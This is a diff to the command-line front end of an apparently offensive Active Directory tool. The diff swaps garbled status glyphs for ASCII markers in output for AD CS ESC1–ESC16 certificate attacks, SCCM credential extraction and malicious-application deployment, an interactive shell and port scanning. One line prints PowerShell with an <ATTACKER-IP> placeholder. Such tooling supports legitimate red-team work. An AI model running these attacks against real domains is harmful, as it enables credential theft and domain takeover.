-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 filtered.len()
             );
             let mut vuln_count = 0usize;
@@ -2307,7 +2286,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 let icon = if vuln.is_some() {
                     "!".red()
                 } else {
-                    "âœ“".green()
+                    "[+]".green()
                 };
                 println!("    {} {} â€” {}", icon, tmpl.name.cyan(), vuln_str);
                 if !tmpl.extended_key_usage.is_empty() {
@@ -2362,7 +2341,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             target_user,
             output,
         } => {
-            println!("  {} Executing ESC1 attack...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Executing ESC1 attack...", ">".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
             println!("    Target User: {}", target_user.cyan());
@@ -2381,7 +2360,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                         banner::print_fail(&format!("Failed to write PFX: {}", e));
                         return 1;
                     }
-                    println!("  {} Certificate obtained!", "âœ“".green());
+                    println!("  {} Certificate obtained!", "[+]".green());
                     println!("    Saved to: {}", output.cyan());
                     println!("    Thumbprint: {}", cert.thumbprint.yellow());
                     println!("    Serial: {}", cert.serial_number.dimmed());
@@ -2408,7 +2387,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             template,
             output,
         } => {
-            println!("  {} Executing ESC2 attack...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Executing ESC2 attack...", ">".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
 
@@ -2426,7 +2405,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                         banner::print_fail(&format!("Failed to write PFX: {}", e));
                         return 1;
                     }
-                    println!("  {} Certificate obtained!", "âœ“".green());
+                    println!("  {} Certificate obtained!", "[+]".green());
                     println!("    Saved to: {}", output.cyan());
                     println!("    Thumbprint: {}", cert.thumbprint.yellow());
                     if wants_json(cli) {
@@ -2452,7 +2431,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             target_template,
             target_user,
         } => {
-            println!("  {} Executing ESC3 attack...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Executing ESC3 attack...", ">".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Agent Template: {}", agent_template.cyan());
             println!("    Target Template: {}", target_template.cyan());
@@ -2477,7 +2456,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                     let _ = tokio::fs::write(&agent_path, &agent_cert.pfx_data).await;
                     let _ = tokio::fs::write(&user_path, &user_cert.pfx_data).await;
 
-                    println!("  {} Obtained 2 certificate(s)", "âœ“".green());
+                    println!("  {} Obtained 2 certificate(s)", "[+]".green());
                     println!(
                         "    Agent cert: {} ({})",
                         agent_path.cyan(),
@@ -2506,7 +2485,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             }
         }
         AdcsAction::Esc4 { ca, template } => {
-            println!("  {} Executing ESC4 attack...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Executing ESC4 attack...", ">".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
 
@@ -2526,7 +2505,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                     }
                     println!(
                         "  {} Template ACLs modified successfully (command generated)",
-                        "âœ“".green()
+                        "[+]".green()
                     );
                 }
                 Err(e) => {
@@ -2538,7 +2517,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         AdcsAction::Esc5 { ca } => {
             println!(
                 "  {} Checking CA '{}' for ESC5 vulnerabilities...",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 ca.cyan()
             );
 
@@ -2600,7 +2579,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                     } else {
                         println!(
                             "  {} CA '{}' â€” no ESC5 ACL weaknesses found",
-                            "âœ“".green(),
+                            "[+]".green(),
                             ca.cyan()
                         );
                     }
@@ -2624,7 +2603,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             }
         }
         AdcsAction::Esc6 { ca, target_user } => {
-            println!("  {} Executing ESC6 attack...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Executing ESC6 attack...", ">".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Target User: {}", target_user.cyan());
 
@@ -2675,7 +2654,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                         banner::print_fail(&format!("Failed to write PFX: {}", e));
                         return 1;
                     }
-                    println!("  {} Certificate obtained via ESC6!", "âœ“".green());
+                    println!("  {} Certificate obtained via ESC6!", "[+]".green());
                     println!("    Saved to: {}", pfx_path.cyan());
                     println!("    Thumbprint: {}", cert.thumbprint.yellow());
                     if wants_json(cli) {
@@ -2698,7 +2677,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         AdcsAction::Esc7 { ca } => {
             println!(
                 "  {} Checking for ESC7 vulnerabilities...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    CA: {}", ca.cyan());
 
@@ -2722,7 +2701,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                     }
                     println!(
                         "  {} CA permissions modified successfully (command generated)",
-                        "âœ“".green()
+                        "[+]".green()
                     );
                 }
                 Err(e) => {
@@ -2732,7 +2711,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             }
         }
         AdcsAction::Esc8 { url, target_user } => {
-            println!("  {} Executing ESC8 attack...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Executing ESC8 attack...", ">".bright_black());
             println!("    URL: {}", url.cyan());
             println!("    Target User: {}", target_user.cyan());
 
@@ -2754,7 +2733,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                     println!("\n{}", commands.yellow());
                     println!(
                         "  {} Certificate obtained via ESC8 relay (command generated)",
-                        "âœ“".green()
+                        "[+]".green()
                     );
                 }
                 Err(e) => {
@@ -2780,7 +2759,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         } => {
             println!(
                 "  {} Executing ESC9 attack (No Security Extension + UPN poisoning)...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
@@ -2827,7 +2806,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 // â”€ LIVE MODE: connect LDAP and auto-poison/restore UPN â”€
                 println!(
                     "  {} Live LDAP mode: auto-poisoning UPN via {}",
-                    "Ã¢â€“Â¸".bright_black(),
+                    ">".bright_black(),
                     dc_ip
                 );
                 let ldap_result = overthrone_core::proto::ldap::LdapSession::connect(
@@ -2853,11 +2832,11 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 // â”€ GUIDANCE MODE: print operator commands, do CSR only â”€
                 let (set_cmd, restore_cmd) =
                     overthrone_core::adcs::Esc9Exploiter::generate_ldap_commands(&config);
-                println!("\n  {} LDAP Setup Commands:", "Ã¢â€“Â¸".bright_black());
+                println!("\n  {} LDAP Setup Commands:", ">".bright_black());
                 println!("{}", set_cmd.yellow());
                 println!(
                     "\n  {} After obtaining certificate, restore the UPN:",
-                    "Ã¢â€“Â¸".bright_black()
+                    ">".bright_black()
                 );
                 println!("{}", restore_cmd.dimmed());
                 println!(
@@ -2872,11 +2851,11 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
 
             match result {
                 Ok(result) => {
-                    println!("\n  {} Certificate obtained!", "âœ“".green());
+                    println!("\n  {} Certificate obtained!", "[+]".green());
                     println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
                     println!("    Saved to: {}", output.cyan());
                     if result.upn_restored {
-                        println!("    UPN: {} restored", "âœ“".green());
+                        println!("    UPN: {} restored", "[+]".green());
                     } else {
                         println!(
                             "    UPN: {} restore pending (see LDAP commands above)",
@@ -2908,7 +2887,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         } => {
             println!(
                 "  {} Executing ESC10 attack (Weak Certificate Mapping)...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
@@ -2971,7 +2950,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 // â”€ LIVE MODE (Variant B): connect LDAP and auto-poison/restore UPN â”€
                 println!(
                     "  {} Live LDAP mode (Variant B): auto-poisoning UPN via {}",
-                    "Ã¢â€“Â¸".bright_black(),
+                    ">".bright_black(),
                     dc_ip
                 );
                 let ldap_result = overthrone_core::proto::ldap::LdapSession::connect(
@@ -3006,7 +2985,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
 
             match result {
                 Ok(result) => {
-                    println!("\n  {} Certificate obtained!", "âœ“".green());
+                    println!("\n  {} Certificate obtained!", "[+]".green());
                     println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
                     println!("    Saved to: {}", output.cyan());
                     println!("    Auth: {}", result.auth_hints.certipy_command.yellow());
@@ -3031,7 +3010,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         } => {
             println!(
                 "  {} Assessing ESC11 (NTLM Relay to ICPR)...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    CA Host: {}", ca_host.cyan());
             println!("    CA Name: {}", ca_name.cyan());
@@ -3062,7 +3041,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 // â”€ LIVE MODE: read InterfaceFlags via WINREG RPC â”€
                 println!(
                     "  {} Live mode: connecting SMB to {} for registry read...",
-                    "Ã¢â€“Â¸".bright_black(),
+                    ">".bright_black(),
                     ca_host
                 );
                 let smb_result = overthrone_core::proto::smb::SmbSession::connect(
@@ -3108,14 +3087,14 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             } else if assessment.interface_flags.is_some() {
                 println!(
                     "  {} CA appears NOT vulnerable (IF_ENFORCEENCRYPTICERTREQUEST is set)",
-                    "âœ“".green()
+                    "[+]".green()
                 );
             }
-            println!("\n  {} Registry path checked:", "Ã¢â€“Â¸".bright_black());
+            println!("\n  {} Registry path checked:", ">".bright_black());
             println!("    {}", assessment.registry_path.cyan());
-            println!("\n  {} Relay command:", "Ã¢â€“Â¸".bright_black());
+            println!("\n  {} Relay command:", ">".bright_black());
             println!("{}", assessment.relay_command.yellow());
-            println!("\n  {} Remediation:", "Ã¢â€“Â¸".bright_black());
+            println!("\n  {} Remediation:", ">".bright_black());
             println!("{}", assessment.remediation.dimmed());
         }
         AdcsAction::Esc12 {
@@ -3126,7 +3105,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         } => {
             println!(
                 "  {} Generating ESC12 CA key extraction guidance...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    CA Host: {}", ca_host.cyan());
             println!("    CA Name: {}", ca_name.cyan());
@@ -3142,17 +3121,17 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             let exploiter = overthrone_core::adcs::Esc12Exploiter::new(config);
             let assessment = exploiter.assess();
 
-            println!("\n  {} Certutil backup command:", "Ã¢â€“Â¸".bright_black());
+            println!("\n  {} Certutil backup command:", ">".bright_black());
             println!("{}", assessment.certutil_backup_command.yellow());
-            println!("\n  {} Certipy command:", "Ã¢â€“Â¸".bright_black());
+            println!("\n  {} Certipy command:", ">".bright_black());
             println!("{}", assessment.certipy_command.yellow());
-            println!("\n  {} Offline forgery:", "Ã¢â€“Â¸".bright_black());
+            println!("\n  {} Offline forgery:", ">".bright_black());
             println!("{}", assessment.offline_forgery_command.yellow());
-            println!("\n  {} CA key paths to check:", "Ã¢â€“Â¸".bright_black());
+            println!("\n  {} CA key paths to check:", ">".bright_black());
             for path in &assessment.ca_key_paths {
                 println!("    {}", path.cyan());
             }
-            println!("\n  {} Remediation:", "Ã¢â€“Â¸".bright_black());
+            println!("\n  {} Remediation:", ">".bright_black());
             println!("{}", assessment.remediation.dimmed());
         }
         AdcsAction::Esc13 {
@@ -3165,7 +3144,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         } => {
             println!(
                 "  {} Executing ESC13 attack (Issuance Policy OID-to-Group Link)...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
@@ -3190,7 +3169,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
 
             match exploiter.exploit(&config).await {
                 Ok(result) => {
-                    println!("\n  {} Certificate obtained!", "âœ“".green());
+                    println!("\n  {} Certificate obtained!", "[+]".green());
                     println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
                     println!("    Saved to: {}", output.cyan());
                     println!("    Granted Group: {}", result.granted_group_dn.yellow());
@@ -3212,7 +3191,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         } => {
             println!(
                 "  {} Assessing ESC14 attack (altSecurityIdentities Mapping)...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    Target DN: {}", target_dn.cyan());
             println!("    Target SAM: {}", target_sam.cyan());
@@ -3254,7 +3233,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                     Ok(result) => {
                         println!(
                             "\n  {} Mapping written successfully via LDAP!",
-                            "âœ“".green()
+                            "[+]".green()
                         );
                         println!("    PKINIT: {}", result.pkinit_command.cyan());
                         println!("    Impact: {}", result.impact_description.yellow());
@@ -3269,11 +3248,11 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             } else {
                 match exploiter.assess(&config) {
                     Ok(result) => {
-                        println!("\n  {} ESC14 Guidance Generated:", "Ã¢â€“Â¸".bright_black());
+                        println!("\n  {} ESC14 Guidance Generated:", ">".bright_black());
                         for step in result.guidance {
                             println!("    {}", step);
                         }
-                        println!("\n  {} PKINIT Command Template:", "Ã¢â€“Â¸".bright_black());
+                        println!("\n  {} PKINIT Command Template:", ">".bright_black());
                         println!("    {}", result.pkinit_command.cyan());
                         println!("\n  {} CLEANUP COMMAND:", "i".dimmed());
                         println!("{}", result.cleanup_command.dimmed());
@@ -3293,7 +3272,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         } => {
             println!(
                 "  {} Executing ESC15 attack (Schema V1 EKUwu abuse)...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
@@ -3321,7 +3300,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                         banner::print_fail(&format!("Failed to write PFX: {}", e));
                         return 1;
                     }
-                    println!("\n  {} Certificate obtained via ESC15!", "âœ“".green());
+                    println!("\n  {} Certificate obtained via ESC15!", "[+]".green());
                     println!("    Saved to: {}", output.cyan());
                     println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
                     println!("    PKINIT: {}", result.pkinit_command.cyan());
@@ -3344,7 +3323,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         } => {
             println!(
                 "  {} Executing ESC16 attack (NO_SECURITY_EXTENSION abuse)...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
@@ -3376,7 +3355,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                         banner::print_fail(&format!("Failed to write PFX: {}", e));
                         return 1;
                     }
-                    println!("\n  {} Certificate obtained via ESC16!", "âœ“".green());
+                    println!("\n  {} Certificate obtained via ESC16!", "[+]".green());
                     println!("    Saved to: {}", output.cyan());
                     println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
                     println!("    PKINIT: {}", result.pkinit_command.cyan());
@@ -3399,7 +3378,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             san,
             output,
         } => {
-            println!("  {} Requesting certificate...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Requesting certificate...", ">".bright_black());
             println!("    CA: {}", ca.cyan());
             println!("    Template: {}", template.cyan());
             if let Some(subj) = subject {
@@ -3427,7 +3406,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                         banner::print_fail(&format!("Failed to write PFX: {}", e));
                         return 1;
                     }
-                    println!("  {} Certificate obtained!", "âœ“".green());
+                    println!("  {} Certificate obtained!", "[+]".green());
                     println!("    Saved to: {}", output.cyan());
                     println!("    Thumbprint: {}", cert.thumbprint.yellow());
                     println!("    Serial: {}", cert.serial_number.dimmed());
@@ -3452,10 +3431,10 @@ pub async fn cmd_shell(target: &str, shell_type: &ShellType) -> i32 {
     banner::print_module_banner("SHELL");
     println!(
         "  {} Starting interactive shell session",
-        "Ã¢â€“Â¸".bright_black()
+        ">".bright_black()
     );
-    println!("  {} Target: {}", "Ã¢â€“Â¸".bright_black(), target.cyan());
-    println!("  {} Type: {:?}", "Ã¢â€“Â¸".bright_black(), shell_type);
+    println!("  {} Target: {}", ">".bright_black(), target.cyan());
+    println!("  {} Type: {:?}", ">".bright_black(), shell_type);
     println!();
 
     // Use the new interactive shell implementation with target
@@ -3495,7 +3474,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
 
             println!(
                 "  {} Enumerating SCCM on {}...",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 target.cyan()
             );
 
@@ -3530,7 +3509,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
             for site in &sites {
                 println!(
                     "\n  {} Site {} @ {} ({})",
-                    "âœ“".green(),
+                    "[+]".green(),
                     site.site_code.cyan(),
                     site.site_server.cyan(),
                     site.version.dimmed()
@@ -3538,11 +3517,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
 
                 match sccm::wmi::enumerate_collections(site).await {
                     Ok(cols) if !cols.is_empty() => {
-                        println!(
-                            "  {} Collections ({}):",
-                            "Ã¢â€“Â¸".bright_black(),
-                            cols.len()
-                        );
+                        println!("  {} Collections ({}):", ">".bright_black(), cols.len());
                         for c in &cols {
                             println!(
                                 "    - [{}] {} ({} members, {})",
@@ -3555,14 +3530,14 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
                     }
                     Ok(_) => println!(
                         "  {} Collections: (WMI requires Windows â€” see debug log for PowerShell)",
-                        "Ã¢â€“Â¸".bright_black()
+                        ">".bright_black()
                     ),
                     Err(e) => println!("  {} Collections: {}", "!".yellow(), e),
                 }
 
                 match sccm::wmi::enumerate_devices(site).await {
                     Ok(devs) if !devs.is_empty() => {
-                        println!("  {} Devices ({}):", "Ã¢â€“Â¸".bright_black(), devs.len());
+                        println!("  {} Devices ({}):", ">".bright_black(), devs.len());
                         for d in devs.iter().take(20) {
                             println!("    - {} [{}]", d.name.cyan(), d.os_name.dimmed());
                         }
@@ -3576,11 +3551,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
 
                 match sccm::wmi::enumerate_applications(site).await {
                     Ok(apps) if !apps.is_empty() => {
-                        println!(
-                            "  {} Applications ({}):",
-                            "Ã¢â€“Â¸".bright_black(),
-                            apps.len()
-                        );
+                        println!("  {} Applications ({}):", ">".bright_black(), apps.len());
                         for a in apps.iter().take(20) {
                             println!(
                                 "    - {} [{}]{}",
@@ -3610,7 +3581,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
 
             println!(
                 "  {} Abusing SCCM on {}...",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 site_server.cyan()
             );
 
@@ -3649,7 +3620,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
                             if let Some(ps) = &res.command_output {
                                 println!(
                                     "  {} PowerShell (replace <ATTACKER-IP> then run on Windows pivot):",
-                                    "Ã¢â€“Â¸".bright_black()
+                                    ">".bright_black()
                                 );
                                 println!("{}", ps);
                             }
@@ -3676,17 +3647,13 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
                     .await
                     {
                         Ok(res) => {
-                            println!(
-                                "  {} Technique: {}",
-                                "Ã¢â€“Â¸".bright_black(),
-                                res.technique
-                            );
+                            println!("  {} Technique: {}", ">".bright_black(), res.technique);
                             if res.credentials.is_empty() {
                                 println!("  {} No NAA credentials extracted", "!".yellow());
                             } else {
                                 println!(
                                     "  {} {} NAA credential(s):",
-                                    "âœ“".green(),
+                                    "[+]".green(),
                                     res.credentials.len()
                                 );
                                 for c in &res.credentials {
@@ -3716,7 +3683,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
                     {
                         Ok(res) => {
                             if let Some(output) = &res.command_output {
-                                println!("  {} AdminService results:", "âœ“".green());
+                                println!("  {} AdminService results:", "[+]".green());
                                 for line in output.lines() {
                                     println!("    {}", line);
                                 }
@@ -3750,7 +3717,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
 
             println!(
                 "  {} Deploying '{}' to collection '{}'...",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 app_name.cyan(),
                 collection.cyan()
             );
@@ -3790,10 +3757,7 @@ pub async fn cmd_sccm(cli: &Cli, action: &SccmAction) -> i32 {
             match sccm::deploy_malicious_application(&sites[0], collection, payload).await {
                 Ok(res) => {
                     if let Some(ps) = &res.command_output {
-                        println!(
-                            "  {} PowerShell deployment script:",
-                            "Ã¢â€“Â¸".bright_black()
-                        );
+                        println!("  {} PowerShell deployment script:", ">".bright_black());
                         println!("{}", ps);
                     }
                     for note in &res.notes {
@@ -3828,7 +3792,7 @@ pub async fn cmd_scan(
     use overthrone_core::scan::{PortScanner, ScanConfig, ScanType as CoreScanType};
 
     banner::print_module_banner("SCAN");
-    println!("  {} Targets: {}", "Ã¢â€“Â¸".bright_black(), targets.cyan());
+    println!("  {} Targets: {}", ">".bright_black(), targets.cyan());
 
     // 1. Unauthenticated Discovery (if single target)
     if !targets.contains('/') && !targets.contains('-') && (ldap || smb) {
@@ -3838,7 +3802,7 @@ pub async fn cmd_scan(
                 // rootDSE pre-bind probe
                 println!(
                     "  {} LDAP rootDSE Probe: {}",
-                    "Ã¢â€“Â¸".bright_black(),
+                    ">".bright_black(),
                     if res.ldap_rootdse_probe {
                         "OK".green().bold()
                     } else {
@@ -3847,23 +3811,19 @@ pub async fn cmd_scan(
                 );
                 if res.ldap_rootdse_probe {
                     if let Some(ref dns) = res.dns_hostname {
-                        println!(
-                            "    {} DNS Hostname: {}",
-                            "Ã¢â€“Â¸".bright_black(),
-                            dns.cyan()
-                        );
+                        println!("    {} DNS Hostname: {}", ">".bright_black(), dns.cyan());
                     }
                     if !res.supported_sasl_mechs.is_empty() {
                         println!(
                             "    {} SASL Mechs: {}",
-                            "Ã¢â€“Â¸".bright_black(),
+                            ">".bright_black(),
                             res.supported_sasl_mechs.join(", ").yellow()
                         );
                     }
                     if !res.naming_contexts.is_empty() {
                         println!(
                             "    {} Naming Contexts: {}",
-                            "Ã¢â€“Â¸".bright_black(),
+                            ">".bright_black(),
                             res.naming_contexts.first().unwrap().cyan()
                         );
                     }
@@ -3871,7 +3831,7 @@ pub async fn cmd_scan(
                 // Anonymous bind
                 println!(
                     "  {} LDAP Null Session: {}",
-                    "Ã¢â€“Â¸".bright_black(),
+                    ">".bright_black(),
                     if res.ldap_null_session {
                         "OK".green().bold()
                     } else {
@@ -3882,7 +3842,7 @@ pub async fn cmd_scan(
             if smb {
                 println!(
                     "  {} SMB Null Session: {}",
-                    "Ã¢â€“Â¸".bright_black(),
+                    ">".bright_black(),
                     if res.smb_null_session {
                         "OK".green().bold()
                     } else {
@@ -3892,7 +3852,7 @@ pub async fn cmd_scan(
                 if !res.accessible_shares.is_empty() {
                     println!(
                         "    {} Readable shares: {}",
-                        "Ã¢â€“Â¸".bright_black(),
+                        ">".bright_black(),
                         res.accessible_shares.join(", ").yellow()
                     );
                 }
@@ -3901,9 +3861,9 @@ pub async fn cmd_scan(
     }
 
     // 2. Port Scanning
-    println!("  {} Ports: {}", "Ã¢â€“Â¸".bright_black(), ports.cyan());
-    println!("  {} Type: {:?}", "Ã¢â€“Â¸".bright_black(), scan_type);
-    println!("  {} Timeout: {}ms", "Ã¢â€“Â¸".bright_black(), timeout);
+    println!("  {} Ports: {}", ">".bright_black(), ports.cyan());
+    println!("  {} Type: {:?}", ">".bright_black(), scan_type);
+    println!("  {} Timeout: {}ms", ">".bright_black(), timeout);
 
     let core_scan_type = match scan_type {
         ScanType::Syn => CoreScanType::Syn,
@@ -3921,7 +3881,7 @@ pub async fn cmd_scan(
 
     let scanner = PortScanner::new(config);
 
-    println!("  {} Starting port scan...", "Ã¢â€“Â¸".bright_black());
+    println!("  {} Starting port scan...", ">".bright_black());
 
     match scanner.scan().await {
         Ok(results) => {
@@ -3954,7 +3914,7 @@ pub async fn cmd_scan(
 
             println!(
                 "  {} Scan complete: {} open ports found",
-                "âœ“".green(),
+                "[+]".green(),
                 open_ports
             );
 
@@ -4000,7 +3960,7 @@ pub async fn cmd_tui(cli: &Cli, domain: &str, crawl: bool, load: Option<&str>) -
     let graph = Arc::new(Mutex::new(if let Some(path) = load {
         println!(
             "  {} Loading graph from {}...",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             path.cyan()
         );
         match AttackGraph::from_json_file(path) {
@@ -4160,7 +4120,7 @@ pub async fn cmd_plugin(
         PluginAction::Enable { plugin_id } => {
             println!(
                 "{} Enabling plugin: {}",
-                "âœ“".bright_black(),
+                "[+]".bright_black(),
                 plugin_id.cyan()
             );
             registry.enable(&plugin_id);
@@ -4169,7 +4129,7 @@ pub async fn cmd_plugin(
         PluginAction::Disable { plugin_id } => {
             println!(
                 "{} Disabling plugin: {}",
-                "âœ—".bright_black(),
+                "[-]".bright_black(),
                 plugin_id.cyan()
             );
             registry.disable(&plugin_id);
